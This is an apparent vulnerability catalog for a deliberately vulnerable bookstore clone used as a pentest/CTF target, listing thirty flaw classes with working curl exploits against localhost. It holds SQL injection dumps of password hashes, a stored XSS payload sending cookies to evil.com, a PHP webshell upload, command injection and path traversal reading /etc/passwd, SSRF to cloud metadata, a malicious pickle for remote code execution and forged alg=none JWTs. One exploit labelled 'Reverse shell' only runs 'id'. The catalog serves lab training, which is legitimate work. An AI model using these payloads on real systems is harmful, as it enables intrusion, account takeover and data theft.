# YES24 Clone - Vulnerability Catalog

> **Purpose**: This application is an intentional pentest/CTF target. All vulnerabilities listed below are **by design**.

---

## B1. SQL Injection (CWE-89)

### B1.1 Raw Search Endpoint
- **Endpoint**: `GET /api/v1/search/raw?q=`
- **Severity**: Critical
- **Description**: Search query is concatenated directly into raw SQL string without parameterization.
- **Attack Vector**: Inject SQL via the `q` parameter.
- **Exploit**:
```bash
# Extract all usernames and password hashes
curl "http://localhost:8000/api/v1/search/raw?q=' UNION SELECT id,0,email,password_hash,0 FROM users--"

# Boolean-based blind injection
curl "http://localhost:8000/api/v1/search/raw?q=' OR 1=1--"
```

### B1.2 User Lookup
- **Endpoint**: `GET /api/v1/users/lookup?username=`
- **Severity**: Critical
- **Description**: Username is concatenated into raw SQL WHERE clause.
- **Attack Vector**: Inject SQL via the `username` parameter.
- **Exploit**:
```bash
# Dump all users
curl "http://localhost:8000/api/v1/users/lookup?username=' OR '1'='1"

# Extract admin credentials
curl "http://localhost:8000/api/v1/users/lookup?username=' UNION SELECT id,email,password_hash,phone,point_balance,grade,username FROM users WHERE is_admin=true--"
```

### B1.3 Legacy Search Mode
- **Endpoint**: `GET /api/v1/search?q=test&legacy=1`
- **Severity**: Critical
- **Description**: When `legacy=1` parameter is set, search switches to raw SQL concatenation.
- **Exploit**:
```bash
curl "http://localhost:8000/api/v1/search?q=test' UNION SELECT 1,2,email,password_hash,5,6,7,8,9,10,11,12,'2024-01-01','book',0 FROM users--&legacy=1"
```

---

## B2. Stored XSS (CWE-79)

### B2.1 Review Content - Stored XSS
- **Endpoint**: `POST /api/v1/products/{goods_no}/reviews`
- **Severity**: High
- **Description**: Review title and content are stored without any HTML sanitization. Content is rendered as raw HTML.
- **Attack Vector**: Submit a review containing malicious JavaScript.
- **Exploit**:
```bash
# Create review with XSS payload
curl -X POST http://localhost:8000/api/v1/products/100000001/reviews \
  -H "Content-Type: application/json" \
  -b "ASP.NET_SessionId=YOUR_SESSION" \
  -d '{"rating": 5, "title": "<img src=x onerror=alert(document.cookie)>", "content": "<script>fetch(\"http://evil.com/steal?c=\"+document.cookie)</script>"}'
```

### B2.2 Raw HTML Reviews
- **Endpoint**: `GET /api/v1/products/{goods_no}/reviews/raw`
- **Severity**: High
- **Description**: Returns review content as `text/html` without escaping. Any stored XSS payload executes.
- **Exploit**:
```bash
# View raw HTML (any stored XSS will execute in browser)
curl http://localhost:8000/api/v1/products/100000001/reviews/raw
```

### B2.3 Username XSS
- **Endpoint**: `POST /api/v1/auth/register`
- **Severity**: Medium
- **Description**: Username field is not sanitized. Stored and displayed wherever username appears.
- **Exploit**:
```bash
curl -X POST http://localhost:8000/api/v1/auth/register \
  -H "Content-Type: application/json" \
  -d '{"email": "xss@test.com", "username": "<script>alert(1)</script>", "password": "test1234"}'
```

### B2.4 Q&A Content - Stored XSS
- **Endpoint**: `POST /api/v1/products/{goods_no}/qna`
- **Severity**: High
- **Description**: Question title and body are not sanitized.
- **Exploit**:
```bash
curl -X POST http://localhost:8000/api/v1/products/100000001/qna \
  -H "Content-Type: application/json" \
  -b "ASP.NET_SessionId=YOUR_SESSION" \
  -d '{"title": "<img src=x onerror=alert(1)>", "body": "<script>alert(\"xss\")</script>"}'
```

---

## B3. IDOR - Insecure Direct Object Reference (CWE-639)

### B3.1 View Any Order
- **Endpoint**: `GET /api/v1/orders/{order_id}`
- **Severity**: High
- **Description**: Returns order details by numeric ID without verifying the requester owns the order. No auth required.
- **Exploit**:
```bash
# Enumerate orders 1-100
for i in $(seq 1 100); do curl -s "http://localhost:8000/api/v1/orders/$i" | head -c 200; echo; done
```

### B3.2 View Any User Profile (with password hash)
- **Endpoint**: `GET /api/v1/users/{user_id}`
- **Severity**: Critical
- **Description**: Returns full user profile including email, phone, password_hash, is_admin flag. No auth required.
- **Exploit**:
```bash
# Get user 1's full profile including password hash
curl http://localhost:8000/api/v1/users/1

# Enumerate all users
for i in $(seq 1 20); do curl -s "http://localhost:8000/api/v1/users/$i" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('email',''), d.get('password_hash','')[:30])"; done
```

### B3.3 Edit Any Review
- **Endpoint**: `PUT /api/v1/reviews/{review_id}`
- **Severity**: High
- **Description**: Allows editing any review without verifying ownership. No auth required.
- **Exploit**:
```bash
curl -X PUT http://localhost:8000/api/v1/reviews/1 \
  -H "Content-Type: application/json" \
  -d '{"content": "Defaced review content", "rating": 1}'
```

### B3.4 Cancel Any Order
- **Endpoint**: `DELETE /api/v1/orders/{order_id}/cancel`
- **Severity**: High
- **Description**: Allows cancelling any order without auth or ownership check.
- **Exploit**:
```bash
curl -X DELETE http://localhost:8000/api/v1/orders/1/cancel
```

---

## B4. Broken Authentication (CWE-287)

### B4.1 No Rate Limiting / Account Lockout
- **Endpoint**: `POST /api/v1/auth/login`
- **Severity**: High
- **Description**: No rate limiting or account lockout on login attempts. Brute-force attacks possible.
- **Exploit**:
```bash
# Brute force with common passwords
for pw in test1234 password123 admin123 qwerty; do
  curl -s -X POST http://localhost:8000/api/v1/auth/login \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"user1@yes24clone.com\",\"password\":\"$pw\"}" | head -c 100
  echo
done
```

### B4.2 Debug Session Info Leak
- **Endpoint**: `GET /api/v1/auth/debug-session?session_id=`
- **Severity**: Critical
- **Description**: Returns user details for any valid session ID. Can be used to hijack sessions.
- **Exploit**:
```bash
curl "http://localhost:8000/api/v1/auth/debug-session?session_id=KNOWN_SESSION_ID"
```

### B4.3 Hardcoded Admin Credentials
- **Endpoint**: `POST /api/v1/auth/admin-login`
- **Severity**: Critical
- **Description**: Hardcoded credentials: username=`admin`, password=`admin123`.
- **Exploit**:
```bash
curl -X POST http://localhost:8000/api/v1/auth/admin-login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": "admin123"}'
```

### B4.4 Session Enumeration
- **Endpoint**: `GET /api/v1/auth/sessions`
- **Severity**: Critical
- **Description**: Lists ALL active session IDs and their associated user IDs.
- **Exploit**:
```bash
curl http://localhost:8000/api/v1/auth/sessions
```

---

## B5. Sensitive Data Exposure (CWE-200)

### B5.1 Config Endpoint
- **Endpoint**: `GET /api/v1/config`
- **Severity**: Critical
- **Description**: Exposes database URL, Redis URL, MinIO credentials, and session configuration.
- **Exploit**:
```bash
curl http://localhost:8000/api/v1/config
```

### B5.2 Full Stack Traces
- **Mechanism**: Global exception handler in `main.py`
- **Severity**: Medium
- **Description**: All unhandled exceptions return full Python stack traces including file paths and internal state.
- **Exploit**:
```bash
# Trigger an error to see the stack trace
curl "http://localhost:8000/api/v1/search/raw?q='" 2>/dev/null | python3 -m json.tool
```

### B5.3 Password Hash Exposure
- **Endpoint**: `GET /api/v1/users/{user_id}`
- **Severity**: Critical
- **Description**: User endpoint returns bcrypt password hashes.
- **Exploit**:
```bash
curl http://localhost:8000/api/v1/users/1 | python3 -c "import sys,json; print(json.load(sys.stdin)['password_hash'])"
```

### B5.4 X-Debug-Info Header
- **Mechanism**: DebugHeaderMiddleware in `main.py`
- **Severity**: Low
- **Description**: Every response includes X-Debug-Info and X-Powered-By headers revealing server stack.
- **Exploit**:
```bash
curl -I http://localhost:8000/healthz 2>/dev/null | grep -i "x-debug\|x-powered"
```

---

## B6. SSRF - Server-Side Request Forgery (CWE-918)

### B6.1 Fetch Cover
- **Endpoint**: `POST /api/v1/products/fetch-cover`
- **Severity**: Critical
- **Description**: Accepts arbitrary URL and fetches it server-side. No URL validation — can access internal services, cloud metadata, etc.
- **Exploit**:
```bash
# Access cloud metadata (AWS)
curl -X POST http://localhost:8000/api/v1/products/fetch-cover \
  -H "Content-Type: application/json" \
  -d '{"url": "http://169.254.169.254/latest/meta-data/"}'

# Scan internal network
curl -X POST http://localhost:8000/api/v1/products/fetch-cover \
  -H "Content-Type: application/json" \
  -d '{"url": "http://localhost:5432/"}'
```

### B6.2 Webhook Callback
- **Endpoint**: `POST /api/v1/webhooks/notify`
- **Severity**: High
- **Description**: POSTs arbitrary data to any callback URL. Can be used for SSRF and data exfiltration.
- **Exploit**:
```bash
curl -X POST http://localhost:8000/api/v1/webhooks/notify \
  -H "Content-Type: application/json" \
  -d '{"callback_url": "http://169.254.169.254/latest/meta-data/", "data": {"test": 1}}'
```

---

## B7. Insecure File Upload (CWE-434)

### B7.1 Unrestricted File Upload
- **Endpoint**: `POST /api/v1/upload/profile-image`
- **Severity**: High
- **Description**: Accepts any file type, no size limit, no content-type validation. Filename stored as-is (path traversal possible).
- **Exploit**:
```bash
# Upload a PHP webshell
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
curl -X POST http://localhost:8000/api/v1/upload/profile-image \
  -F "file=@/tmp/shell.php"

# Path traversal in filename
curl -X POST http://localhost:8000/api/v1/upload/profile-image \
  -F "file=@/tmp/shell.php;filename=../../../etc/evil.txt"
```

---

## B8. Mass Assignment (CWE-915)

### B8.1 User Update - Privilege Escalation
- **Endpoint**: `PUT /api/v1/users/{user_id}`
- **Severity**: Critical
- **Description**: Accepts any field in the request body including `is_admin`, `point_balance`, `grade`.
- **Exploit**:
```bash
# Escalate to admin
curl -X PUT http://localhost:8000/api/v1/users/1 \
  -H "Content-Type: application/json" \
  -d '{"is_admin": true, "point_balance": 999999, "grade": "VIP"}'
```

### B8.2 Registration - Admin Flag
- **Endpoint**: `POST /api/v1/auth/register`
- **Severity**: Critical
- **Description**: Registration accepts `is_admin` field in request body.
- **Exploit**:
```bash
curl -X POST http://localhost:8000/api/v1/auth/register \
  -H "Content-Type: application/json" \
  -d '{"email": "hacker@evil.com", "username": "hacker", "password": "pass123", "is_admin": true}'
```

---

## B9. Weak Session Management (CWE-330)

### B9.1 Predictable Session Tokens
- **Endpoint**: `POST /api/v1/auth/login-weak`
- **Severity**: Critical
- **Description**: Uses `MD5(email + unix_timestamp)` as session ID. Predictable if email and approximate login time are known.
- **Exploit**:
```bash
# Login with weak session
curl -X POST http://localhost:8000/api/v1/auth/login-weak \
  -H "Content-Type: application/json" \
  -d '{"email": "user1@yes24clone.com", "password": "test1234"}'

# Preview predicted token
curl "http://localhost:8000/api/v1/auth/token-preview?email=user1@yes24clone.com"
```

### B9.2 Token Prediction
- **Endpoint**: `GET /api/v1/auth/token-preview?email=`
- **Severity**: High
- **Description**: Reveals what the next session token would be for a given email, enabling session prediction attacks.
- **Exploit**:
```bash
curl "http://localhost:8000/api/v1/auth/token-preview?email=user1@yes24clone.com"
```

---

## B10. CSRF - Cross-Site Request Forgery (CWE-352)

### B10.1 Transfer Points (No CSRF Protection)
- **Endpoint**: `POST /api/v1/vuln/transfer-points`
- **Severity**: High
- **Description**: Points transfer endpoint has no CSRF token, no origin check, and session cookie uses `samesite=none`. An attacker can create a malicious page that auto-submits a form to transfer the victim's points.
- **Exploit**:
```bash
# Transfer points from authenticated user (requires session cookie)
curl -X POST http://localhost:8000/api/v1/vuln/transfer-points \
  -H "Content-Type: application/json" \
  -b "ASP.NET_SessionId=VICTIM_SESSION" \
  -d '{"to_user_id": 2, "amount": 5000}'
```

---

## B11. Open Redirect & Information Disclosure (CWE-601 / CWE-200)

### B11.1 Open Redirect
- **Endpoint**: `GET /api/v1/vuln/redirect?url=`
- **Severity**: Medium
- **Description**: Redirects to any URL without validation. Can be used for phishing by making a legitimate-looking URL redirect to a malicious site.
- **Exploit**:
```bash
curl -v "http://localhost:8000/api/v1/vuln/redirect?url=https://evil.com/phish"
```

### B11.2 Password Reset Token in Response
- **Endpoint**: `POST /api/v1/auth/forgot-password`
- **Severity**: High
- **Description**: Password reset token is returned directly in the API response instead of being sent via email. Anyone who knows a user's email can reset their password.
- **Exploit**:
```bash
curl -X POST http://localhost:8000/api/v1/auth/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"email": "user1@yes24clone.com"}'
# Response contains reset_token — use it to reset password
```

### B11.3 Email Verification Code in Response
- **Endpoint**: `POST /api/v1/auth/send-verification`
- **Severity**: Medium
- **Description**: 6-digit verification code returned in response instead of sent via email.
- **Exploit**:
```bash
curl -X POST http://localhost:8000/api/v1/auth/send-verification \
  -H "Content-Type: application/json" \
  -d '{"email": "user1@yes24clone.com"}'
```

---

## B12. Broken Access Control - Client-Side Admin Check (CWE-284)

### B12.1 Admin User List
- **Endpoint**: `GET /api/v1/admin/users`
- **Severity**: Critical
- **Description**: Admin access control is enforced via `X-Admin: true` header — a client-side check trivially bypassed.
- **Exploit**:
```bash
# List all users by simply adding the X-Admin header
curl http://localhost:8000/api/v1/admin/users -H "X-Admin: true"
```

### B12.2 Admin Stats
- **Endpoint**: `GET /api/v1/admin/stats`
- **Severity**: High
- **Description**: Same client-side admin check.
- **Exploit**:
```bash
curl http://localhost:8000/api/v1/admin/stats -H "X-Admin: true"
```

---

## B13. Command Injection (CWE-78)

### B13.1 Ping Endpoint
- **Endpoint**: `GET /api/v1/vuln/ping?host=`
- **Severity**: Critical
- **Description**: Host parameter passed directly to `shell=True` subprocess. Arbitrary command execution possible via shell metacharacters.
- **Exploit**:
```bash
# Read /etc/passwd via command injection
curl "http://localhost:8000/api/v1/vuln/ping?host=127.0.0.1;cat%20/etc/passwd"

# Reverse shell
curl "http://localhost:8000/api/v1/vuln/ping?host=127.0.0.1;id"
```

### B13.2 Admin Logs Filter
- **Endpoint**: `GET /api/v1/admin/logs?filter=`
- **Severity**: Critical
- **Description**: Filter parameter passed to `grep` via shell. Command injection via shell metacharacters.
- **Exploit**:
```bash
curl "http://localhost:8000/api/v1/admin/logs?filter=';id%20#" -H "X-Admin: true"
```

---

## B14. Path Traversal (CWE-22)

### B14.1 File Read
- **Endpoint**: `GET /api/v1/vuln/file?path=`
- **Severity**: Critical
- **Description**: Reads files from `/app/static/{path}` without sanitizing `..` sequences. Arbitrary file read possible.
- **Exploit**:
```bash
# Read /etc/passwd
curl "http://localhost:8000/api/v1/vuln/file?path=../../etc/passwd"

# Read application source code
curl "http://localhost:8000/api/v1/vuln/file?path=../../app/backend/src/yes24_clone/config.py"
```

---

## B15. ReDoS - Regular Expression DoS (CWE-1333)

### B15.1 Email Validation
- **Endpoint**: `POST /api/v1/vuln/validate-email`
- **Severity**: Medium
- **Description**: Uses catastrophically backtracking regex `^(a+)+$`. With adversarial input like `"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!"`, the regex engine takes exponential time.
- **Exploit**:
```bash
# Normal input — fast
curl -X POST http://localhost:8000/api/v1/vuln/validate-email \
  -H "Content-Type: application/json" \
  -d '{"email": "aaaaaa"}'

# ReDoS input — slow/hang (use carefully)
curl -X POST http://localhost:8000/api/v1/vuln/validate-email \
  -H "Content-Type: application/json" \
  -d '{"email": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!"}'
```

---

## B16. JWT None Algorithm (CWE-345)

### B16.1 JWT with Weak Secret
- **Endpoint**: `POST /api/v1/vuln/jwt-login`
- **Severity**: High
- **Description**: Issues JWT signed with HS256 using the weak secret `secret123`. Secret can be brute-forced.
- **Exploit**:
```bash
curl -X POST http://localhost:8000/api/v1/vuln/jwt-login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "role": "admin"}'
```

### B16.2 JWT alg=none Bypass
- **Endpoint**: `GET /api/v1/vuln/jwt-profile`
- **Severity**: Critical
- **Description**: Accepts `alg: "none"` in JWT header, skipping signature verification entirely. Attacker can forge any identity.
- **Exploit**:
```bash
# Forge a JWT with alg=none
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '+/' '-_')
PAYLOAD=$(echo -n '{"sub":"admin","role":"admin","iat":9999999999}' | base64 | tr -d '=' | tr '+/' '-_')
TOKEN="${HEADER}.${PAYLOAD}."

curl http://localhost:8000/api/v1/vuln/jwt-profile \
  -H "Authorization: Bearer ${TOKEN}"
```

---

## B17. XXE — XML External Entity (CWE-611)

### B17.1 XML Parse
- **Endpoint**: `POST /api/v1/vuln/xml-parse`
- **Severity**: Critical
- **Description**: Parses XML input using `lxml.etree` with `resolve_entities=True` and `no_network=False`. External entities can read local files or perform SSRF.
- **Exploit**:
```bash
curl -X POST http://localhost:8000/api/v1/vuln/xml-parse \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><order><item>&xxe;</item></order>'
```

---

## B18. Insecure Deserialization (CWE-502)

### B18.1 Cart Export
- **Endpoint**: `GET /api/v1/vuln/cart/export`
- **Severity**: Low
- **Description**: Exports cart data as base64-encoded pickle.
- **Exploit**:
```bash
curl http://localhost:8000/api/v1/vuln/cart/export
```

### B18.2 Cart Import — RCE via Pickle
- **Endpoint**: `POST /api/v1/vuln/cart/import`
- **Severity**: Critical
- **Description**: Deserializes arbitrary pickle data via `pickle.loads()`. Attacker can achieve remote code execution.
- **Exploit**:
```bash
# Generate malicious pickle (in Python):
# import pickle, base64, os
# class RCE:
#     def __reduce__(self): return (os.system, ("id > /tmp/pwned",))
# print(base64.b64encode(pickle.dumps(RCE())).decode())

curl -X POST http://localhost:8000/api/v1/vuln/cart/import \
  -H "Content-Type: application/json" \
  -d '{"data": "gASVJAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjA1pZCA+IC90bXAvcHduZWSUhZRSlC4="}'
```

---

## B19. Race Condition (CWE-362)

### B19.1 Coupon Redeem Race
- **Endpoint**: `POST /api/v1/vuln/coupon/redeem`
- **Severity**: High
- **Description**: Non-atomic check-then-act on coupon redemption. Concurrent requests can redeem the same coupon multiple times.
- **Exploit**:
```bash
# Send 10 concurrent requests — multiple will succeed
for i in $(seq 1 10); do
  curl -s -X POST http://localhost:8000/api/v1/vuln/coupon/redeem \
    -H "Content-Type: application/json" \
    -d '{"coupon_code": "RACE50", "user_id": 1}' &
done
wait
```

### B19.2 Points Withdrawal TOCTOU
- **Endpoint**: `POST /api/v1/vuln/points/withdraw`
- **Severity**: High
- **Description**: Balance check and deduction are not atomic. Concurrent withdrawals can cause negative balance.
- **Exploit**:
```bash
# Withdraw more than balance via concurrent requests
for i in $(seq 1 5); do
  curl -s -X POST http://localhost:8000/api/v1/vuln/points/withdraw \
    -H "Content-Type: application/json" \
    -d '{"user_id": 1, "amount": 9000}' &
done
wait
```

---

## B20. Business Logic Bypass (CWE-840)

### B20.1 Order Place — Negative Quantity
- **Endpoint**: `POST /api/v1/vuln/order/place`
- **Severity**: High
- **Description**: No validation on negative quantity or coupon_discount. Negative total awards bonus points.
- **Exploit**:
```bash
# Negative quantity → negative total → points farming
curl -X POST http://localhost:8000/api/v1/vuln/order/place \
  -H "Content-Type: application/json" \
  -d '{"goods_no": 100000001, "quantity": -5, "coupon_discount": 0}'

# Huge coupon discount
curl -X POST http://localhost:8000/api/v1/vuln/order/place \
  -H "Content-Type: application/json" \
  -d '{"goods_no": 100000001, "quantity": 1, "coupon_discount": 99999}'
```

### B20.2 Price Check — No Overflow Protection
- **Endpoint**: `POST /api/v1/vuln/price-check`
- **Severity**: Medium
- **Description**: No floor or overflow validation on quantity.
- **Exploit**:
```bash
curl -X POST http://localhost:8000/api/v1/vuln/price-check \
  -H "Content-Type: application/json" \
  -d '{"goods_no": 100000001, "quantity": 999999999}'
```

---

## B21. CRLF / HTTP Header Injection (CWE-113)

### B21.1 Set Language Header
- **Endpoint**: `GET /api/v1/vuln/set-lang?lang=`
- **Severity**: Medium
- **Description**: Lang parameter injected directly into Content-Language header. CRLF sequences can inject arbitrary headers.
- **Exploit**:
```bash
curl -v "http://localhost:8000/api/v1/vuln/set-lang?lang=ko%0d%0aSet-Cookie:%20admin=true"
```

### B21.2 Redirect Log
- **Endpoint**: `GET /api/v1/vuln/redirect-log?url=`
- **Severity**: Medium
- **Description**: URL parameter injected into Location header. CRLF can inject arbitrary response headers.
- **Exploit**:
```bash
curl -v "http://localhost:8000/api/v1/vuln/redirect-log?url=https://yes24.com%0d%0aX-Injected:%20true"
```

---

## B22. Insecure CORS (CWE-942)

### B22.1 Wildcard CORS with Credentials
- **Endpoint**: `GET /api/v1/vuln/cors-test`
- **Severity**: High
- **Description**: Returns sensitive session data with `Access-Control-Allow-Origin: *` AND `Access-Control-Allow-Credentials: true`. Any origin can read authenticated responses.
- **Exploit**:
```bash
curl -v http://localhost:8000/api/v1/vuln/cors-test \
  -b "ASP.NET_SessionId=some_session"
# Check response headers for CORS misconfiguration
```

---

## B23. Insecure Direct Function Reference (CWE-284)

### B23.1 Admin Action — No Auth
- **Endpoint**: `POST /api/v1/vuln/admin-action`
- **Severity**: Critical
- **Description**: Action parameter directly maps to internal admin functions without any authentication.
- **Exploit**:
```bash
# List all users
curl -X POST http://localhost:8000/api/v1/vuln/admin-action \
  -H "Content-Type: application/json" \
  -d '{"action": "get_users"}'

# Delete all reviews
curl -X POST http://localhost:8000/api/v1/vuln/admin-action \
  -H "Content-Type: application/json" \
  -d '{"action": "delete_reviews"}'

# Get internal config
curl -X POST http://localhost:8000/api/v1/vuln/admin-action \
  -H "Content-Type: application/json" \
  -d '{"action": "get_config"}'
```

---

## B24. GraphQL Introspection (CWE-200)

### B24.1 Schema Introspection
- **Endpoint**: `POST /api/v1/vuln/graphql`
- **Severity**: High
- **Description**: GraphQL-like endpoint with introspection enabled, no auth. Exposes internal types including passwordHash, secretKey.
- **Exploit**:
```bash
# Introspection query
curl -X POST http://localhost:8000/api/v1/vuln/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name } } }"}'

# Query all users with password hashes
curl -X POST http://localhost:8000/api/v1/vuln/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ users { id email passwordHash } }"}'
```

---

## B25. Insecure Randomness (CWE-338)

### B25.1 Predictable Coupon Generation
- **Endpoint**: `POST /api/v1/vuln/generate-coupon`
- **Severity**: High
- **Description**: PRNG seeded with user_id — attacker can predict all coupon codes.
- **Exploit**:
```bash
# Same user_id always produces same coupon
curl -X POST http://localhost:8000/api/v1/vuln/generate-coupon \
  -H "Content-Type: application/json" \
  -d '{"user_id": 1}'
# Run twice — same code
```

### B25.2 Weak Reset Token
- **Endpoint**: `GET /api/v1/vuln/reset-token?email=`
- **Severity**: High
- **Description**: Reset token is a 4-digit number (0000-9999) — only 10,000 possibilities.
- **Exploit**:
```bash
curl "http://localhost:8000/api/v1/vuln/reset-token?email=user1@yes24clone.com"
```

---

## B26. Log Injection (CWE-117)

### B26.1 Feedback Logging
- **Endpoint**: `POST /api/v1/vuln/feedback`
- **Severity**: Medium
- **Description**: User-controlled input written directly to log via f-string. CRLF in message can inject fake log entries.
- **Exploit**:
```bash
curl -X POST http://localhost:8000/api/v1/vuln/feedback \
  -H "Content-Type: application/json" \
  -d '{"message": "normal\n2024-01-01 CRITICAL: Admin password changed to hacker123", "user_agent": "Mozilla"}'
```

---

## B27. Timing Attack (CWE-208)

### B27.1 Admin Password Check
- **Endpoint**: `POST /api/v1/vuln/check-admin-password`
- **Severity**: Medium
- **Description**: Compares password using `==` (short-circuit comparison) instead of `hmac.compare_digest`. Timing differences reveal correct prefix.
- **Exploit**:
```bash
# Time different prefixes
curl -X POST http://localhost:8000/api/v1/vuln/check-admin-password \
  -H "Content-Type: application/json" \
  -d '{"password": "s"}'

curl -X POST http://localhost:8000/api/v1/vuln/check-admin-password \
  -H "Content-Type: application/json" \
  -d '{"password": "x"}'
```

---

## B28. Clickjacking (CWE-1021)

### B28.1 Iframe Demo
- **Endpoint**: `GET /api/v1/vuln/iframe-demo`
- **Severity**: Medium
- **Description**: Returns an HTML page that embeds the login form in a transparent iframe. No `X-Frame-Options` or `Content-Security-Policy: frame-ancestors` header set on any response.
- **Exploit**:
```bash
curl http://localhost:8000/api/v1/vuln/iframe-demo
# Open in browser to see clickjacking overlay
```

---

## B29. HTTP Method Override (CWE-650)

### B29.1 Method Override via Header
- **Endpoint**: `GET /api/v1/vuln/method-override/resource/{id}`
- **Severity**: High
- **Description**: `X-HTTP-Method-Override` header changes the effective HTTP method. A GET request with `X-HTTP-Method-Override: DELETE` deletes the resource. Bypasses WAF/firewall rules that only inspect the HTTP method.
- **Exploit**:
```bash
# DELETE via GET — bypasses firewall rules
curl "http://localhost:8000/api/v1/vuln/method-override/resource/1" \
  -H "X-HTTP-Method-Override: DELETE"
```

---

## B30. Mass Enumeration / Rate Limit Bypass (CWE-770)

### B30.1 User Email Enumeration
- **Endpoint**: `GET /api/v1/vuln/user-exists?email=`
- **Severity**: Medium
- **Description**: Returns 200 for existing emails, 404 for non-existing. No rate limiting.
- **Exploit**:
```bash
# Enumerate emails
for email in admin@yes24.com user1@yes24clone.com test@test.com; do
  echo -n "$email: "
  curl -s -o /dev/null -w "%{http_code}" "http://localhost:8000/api/v1/vuln/user-exists?email=$email"
  echo
done
```

### B30.2 Order ID Enumeration
- **Endpoint**: `GET /api/v1/vuln/order-exists?order_id=`
- **Severity**: Medium
- **Description**: Returns order existence and details without auth. No rate limiting.
- **Exploit**:
```bash
for id in $(seq 1 20); do
  curl -s "http://localhost:8000/api/v1/vuln/order-exists?order_id=$id" | head -c 100
  echo
done
```

---

## Summary Table

| ID | Category | CWE | Endpoint | Severity |
|----|----------|-----|----------|----------|
| B1.1 | SQL Injection | CWE-89 | GET /search/raw | Critical |
| B1.2 | SQL Injection | CWE-89 | GET /users/lookup | Critical |
| B1.3 | SQL Injection | CWE-89 | GET /search?legacy=1 | Critical |
| B2.1 | Stored XSS | CWE-79 | POST /products/{id}/reviews | High |
| B2.2 | Stored XSS | CWE-79 | GET /products/{id}/reviews/raw | High |
| B2.3 | Stored XSS | CWE-79 | POST /auth/register | Medium |
| B2.4 | Stored XSS | CWE-79 | POST /products/{id}/qna | High |
| B3.1 | IDOR | CWE-639 | GET /orders/{id} | High |
| B3.2 | IDOR | CWE-639 | GET /users/{id} | Critical |
| B3.3 | IDOR | CWE-639 | PUT /reviews/{id} | High |
| B3.4 | IDOR | CWE-639 | DELETE /orders/{id}/cancel | High |
| B4.1 | Broken Auth | CWE-287 | POST /auth/login | High |
| B4.2 | Broken Auth | CWE-287 | GET /auth/debug-session | Critical |
| B4.3 | Broken Auth | CWE-287 | POST /auth/admin-login | Critical |
| B4.4 | Broken Auth | CWE-287 | GET /auth/sessions | Critical |
| B5.1 | Data Exposure | CWE-200 | GET /config | Critical |
| B5.2 | Data Exposure | CWE-200 | Exception handler | Medium |
| B5.3 | Data Exposure | CWE-200 | GET /users/{id} | Critical |
| B5.4 | Data Exposure | CWE-200 | X-Debug-Info header | Low |
| B6.1 | SSRF | CWE-918 | POST /products/fetch-cover | Critical |
| B6.2 | SSRF | CWE-918 | POST /webhooks/notify | High |
| B7.1 | File Upload | CWE-434 | POST /upload/profile-image | High |
| B8.1 | Mass Assignment | CWE-915 | PUT /users/{id} | Critical |
| B8.2 | Mass Assignment | CWE-915 | POST /auth/register | Critical |
| B9.1 | Weak Session | CWE-330 | POST /auth/login-weak | Critical |
| B9.2 | Weak Session | CWE-330 | GET /auth/token-preview | High |
| B10.1 | CSRF | CWE-352 | POST /vuln/transfer-points | High |
| B11.1 | Open Redirect | CWE-601 | GET /vuln/redirect | Medium |
| B11.2 | Info Disclosure | CWE-200 | POST /auth/forgot-password | High |
| B11.3 | Info Disclosure | CWE-200 | POST /auth/send-verification | Medium |
| B12.1 | Broken Access Control | CWE-284 | GET /admin/users | Critical |
| B12.2 | Broken Access Control | CWE-284 | GET /admin/stats | High |
| B13.1 | Command Injection | CWE-78 | GET /vuln/ping | Critical |
| B13.2 | Command Injection | CWE-78 | GET /admin/logs | Critical |
| B14.1 | Path Traversal | CWE-22 | GET /vuln/file | Critical |
| B15.1 | ReDoS | CWE-1333 | POST /vuln/validate-email | Medium |
| B16.1 | JWT Weak Secret | CWE-345 | POST /vuln/jwt-login | High |
| B16.2 | JWT None Algorithm | CWE-345 | GET /vuln/jwt-profile | Critical |
| B17.1 | XXE | CWE-611 | POST /vuln/xml-parse | Critical |
| B18.1 | Insecure Deserialization | CWE-502 | GET /vuln/cart/export | Low |
| B18.2 | Insecure Deserialization | CWE-502 | POST /vuln/cart/import | Critical |
| B19.1 | Race Condition | CWE-362 | POST /vuln/coupon/redeem | High |
| B19.2 | Race Condition | CWE-362 | POST /vuln/points/withdraw | High |
| B20.1 | Business Logic Bypass | CWE-840 | POST /vuln/order/place | High |
| B20.2 | Business Logic Bypass | CWE-840 | POST /vuln/price-check | Medium |
| B21.1 | CRLF Injection | CWE-113 | GET /vuln/set-lang | Medium |
| B21.2 | CRLF Injection | CWE-113 | GET /vuln/redirect-log | Medium |
| B22.1 | Insecure CORS | CWE-942 | GET /vuln/cors-test | High |
| B23.1 | Direct Function Ref | CWE-284 | POST /vuln/admin-action | Critical |
| B24.1 | GraphQL Introspection | CWE-200 | POST /vuln/graphql | High |
| B25.1 | Insecure Randomness | CWE-338 | POST /vuln/generate-coupon | High |
| B25.2 | Insecure Randomness | CWE-338 | GET /vuln/reset-token | High |
| B26.1 | Log Injection | CWE-117 | POST /vuln/feedback | Medium |
| B27.1 | Timing Attack | CWE-208 | POST /vuln/check-admin-password | Medium |
| B28.1 | Clickjacking | CWE-1021 | GET /vuln/iframe-demo | Medium |
| B29.1 | HTTP Method Override | CWE-650 | GET /vuln/method-override/resource/{id} | High |
| B30.1 | Mass Enumeration | CWE-770 | GET /vuln/user-exists | Medium |
| B30.2 | Mass Enumeration | CWE-770 | GET /vuln/order-exists | Medium |
